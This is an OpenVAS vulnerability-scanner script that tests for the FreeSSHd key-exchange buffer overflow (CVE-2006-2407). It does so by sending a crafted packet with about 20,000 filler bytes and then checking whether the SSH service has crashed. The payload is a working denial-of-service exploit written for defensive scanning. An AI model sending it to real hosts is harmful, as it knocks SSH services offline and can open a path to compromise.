# OpenVAS Vulnerability Test
# $Id: freesshd_key_exchange_overflow.nasl 13576 2019-02-11 12:44:20Z cfischer $
# Description: FreeSSHD Key Exchange Buffer Overflow
#
# Authors:
# Ferdy Riphagen <f[dot]riphagen[at]nsec[dot]nl>
#
# Copyright:
# Copyright (C) 2008 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.200012");
  script_version("$Revision: 13576 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-11 13:44:20 +0100 (Mon, 11 Feb 2019) $");
  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2006-2407");
  script_bugtraq_id(17958);
  script_name("FreeSSHD Key Exchange Buffer Overflow");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Gain a shell remotely");
  script_copyright("This script is Copyright (C) 2008 Ferdy Riphagen");
  script_dependencies("ssh_detect.nasl");
  script_require_ports("Services/ssh", 22);
  script_mandatory_keys("ssh/freesshd/detected");

  script_tag(name:"summary", value:"A vulnerable version of FreeSSHd is installed on
  the remote host.");

  script_tag(name:"impact", value:"The version installed does not validate key exchange strings
  send by a SSH client. This results in a buffer overflow and possible a compromise of the host
  if the client is sending a long key exchange string.

  Note :

  At this point the FreeSSHD Service is reported down. You should start it manually again.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Upgrade to the latest release.
  See the references for more information.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/19846");
  script_xref(name:"URL", value:"http://www.freesshd.com/?ctt=download");
  exit(0);
}

include("misc_func.inc");
include("ssh_func.inc");

port = get_ssh_port(default:22);
soc = open_sock_tcp(port);
if (!soc) exit(0);

banner = recv(socket:soc, length:128);
if (egrep(pattern:"SSH.+WeOnlyDo", string:banner)) {

  ident = "SSH-2.0-OpenSSH_4.2p1";
  exp = ident +
        raw_string(0x0a, 0x00, 0x00, 0x4f, 0x04, 0x05,
                   0x14, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                   0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xde)
               + crap(length:20400);

  send(socket:soc, data:exp);
  recv(socket:soc, length:1024);
  close(soc);

  soc = open_sock_tcp(port);
  if (soc) {
    recv = recv(socket:soc, length:128);
    close (soc);
  }
  if (!soc || (!strlen(recv))) {
    security_message(port:port);
  }
}

exit(0);